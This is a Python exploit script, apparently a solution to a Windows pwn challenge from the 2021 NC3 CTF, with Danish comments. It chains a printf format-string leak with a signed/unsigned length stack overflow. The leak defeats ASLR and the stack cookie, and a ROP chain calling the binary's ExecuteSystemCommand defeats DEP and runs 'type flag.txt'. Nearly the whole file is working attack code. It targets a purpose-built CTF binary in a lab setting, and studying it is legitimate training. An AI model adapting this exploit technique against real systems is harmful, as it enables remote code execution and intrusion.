# -*- coding: utf-8 -*-

#
# Opgave til #nc3ctf2021 -> JuleKATALOG 3000.21
# -----------------------------------------------------------------------------
#
# Der udnyttes at programmet læser en pakke ind, der indeholder en length.
# Denne length tjekkes som en UNSIGNED INT, men bruges som en SIGNED INT. Det
# kan udnyttes til at få læst mange flere bytes ind, end det tilladte.
# Dvs. der opstår en STACK OVERFLOW. Derefter et info leak via en PRINTF format
# string.
#
# Så udfordringen er først at reverse .EXE filen for derefter at finde begge
# sårbarheder. Da opgavens navn klart hinter om en Windows udgave af en ældre
# PWN opgave i NC3CTF (som en del af en Boot2Root), så var begge disse
# sårbarheder egentlig allerede givet.
# Dette er grunden til at opgaven kom i Øvet-kategorien i stedet for Svær.
#
# For at gøre opgaven så realistisk som mulig, er .EXE filen compilet med både
# ASLR, DEP og Stack Cookies.
# I exploitet kommer vi over både ASLR og Stack Cookies ved at leake hukommelse
# (specielt stakken) via en PRINTF format string, som vi styrer.
# DEP håndteres med en ROP chain.
#
#
# -mr.1oo-
#

import sys
import time
import ctypes
import socket
import struct
#import hexdump
import telnetlib
from ctypes.util import find_library
from time import sleep


def Connect(host):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, 1337))
    return s

def send(s, text):
    s.sendall(text)

def read(s, length):
    return s.recv(length)

def readlen(s, length):
    return ''.join(read(s, 1) for _ in range(length))

def sendline(s, text):
    send(s, text + "\n")

def readuntil(s, stop):
    res = ''

    while not res.endswith(stop):
        c = read(s, 1)

        if c == '':
            break
        res += c
    return res

def interact(s):
    tn = telnetlib.Telnet()
    tn.sock = s
    tn.interact()
    s.close()
    sys.exit(0)

def readall(s):
    out = ''
    while True:
        c = read(s, 1)

        if c == '':
            break
        out += c
        sys.stdout.write(c)
        sys.stdout.flush()
    return out



s = Connect('192.168.56.101')

#print(readall(s))

p = readuntil(s, 'valg:')
print(p)


# Leak stack cookie
payload = "%p" * 24
sendline(s, payload)

p = readuntil(s, 'Den forstod jeg ikke!:\n')
print(p)

stackLeak = readuntil(s, '\n')
print(stackLeak)

addressSize = 8

stackCookieAtStackIndex = 7
stackCookieAsString = stackLeak[stackCookieAtStackIndex * addressSize: (stackCookieAtStackIndex * addressSize) + addressSize]
stackCookie = int(stackCookieAsString, 16)
print("Stack Cookie:", hex(stackCookie))

# .text:004015BA                 call    ?MainLoop@@YAXXZ ; MainLoop(void)
# .text:004015BF                 xor     eax, eax                               <-- Her
mainLoopReturnAddressAtStackIndex = 9
mainLoopReturnAddressAsString = stackLeak[mainLoopReturnAddressAtStackIndex * addressSize: (mainLoopReturnAddressAtStackIndex * addressSize) + addressSize]
mainLoopReturnAddress = int(mainLoopReturnAddressAsString, 16)
print("Main Loop Return Address:", hex(mainLoopReturnAddress))


stackPointerOnStackAtStackIndex = 8
stackPointerOnStackAsString = stackLeak[stackPointerOnStackAtStackIndex * addressSize: (stackPointerOnStackAtStackIndex * addressSize) + addressSize]
stackPointerOnStack = int(stackPointerOnStackAsString, 16)
print("Stack Pointer Address:", hex(stackPointerOnStack))


# 0x00401130  void __usercall ExecuteSystemCommand(const char *pCmd@<ecx>)
executeSystemCommandAddress = mainLoopReturnAddress - 0x48f
print("ExecuteSystemCommand Address:", hex(executeSystemCommandAddress))

# 0x00401fc9 : add esp, 0x18 ; pop ebp ; ret // 83c4185dc3
stackAdjustAddress = mainLoopReturnAddress + 0xa0a
print("Stack Adjust Address:", hex(stackAdjustAddress))

# 0x004016e7 : pop ecx ; ret // 59c3
popEcxAddress = mainLoopReturnAddress + 0x128
print("pop ecx Address:", hex(popEcxAddress))



p = readuntil(s, 'valg:')
print(p)


#payload  = struct.pack("<Q", 0x123123123123)        # func pointer
payload =  "2"
#payload += struct.pack("<i", 1337)
sendline(s, payload)
print(readuntil(s, 'vel?):'))


#payload =  "GULD"
#payload += struct.pack("<i", 32)
#payload += 'A' * 29
#sendline(s, payload)
#print(readuntil(s, 'valg:'))



payload = ''
payload += 'AAAA'
payload += 'BBBB'
payload += struct.pack('I', stackCookie)
payload += 'CCCC'
payload += struct.pack('I', stackAdjustAddress)
payload += 'DDDD' * 7
payload += struct.pack('I', popEcxAddress)
# <stackPointerOnStack> peger faktisk (tilfældigvis) præcis på sig selv, ved at ligge her på stakken.
# Vi flytter derfor strengen lidt længere ned
payload += struct.pack('I', stackPointerOnStack + 4 + 4 + 4)
payload += struct.pack('I', executeSystemCommandAddress)
# Her kunne strengen blive placeret, men det er fint at have nogle faste bytes til debugging:
payload += 'EEEE'
# Og endelig vores streng:
payload += 'type flag.txt' + chr(0x00)

payload += 'F' * (200 - len(payload))

#for i in range(0, 200/4) :
#    payload += 'AB' + "{:02}".format(i)


exploitPayload =  "GULD"
exploitPayload += struct.pack("<i", len(payload))
exploitPayload += payload

sendline(s, exploitPayload)
print(readuntil(s, 'valg:'))




payload =  "4"
sendline(s, payload)
print(readuntil(s, 'valg:'))


print(readall(s))

s.close()
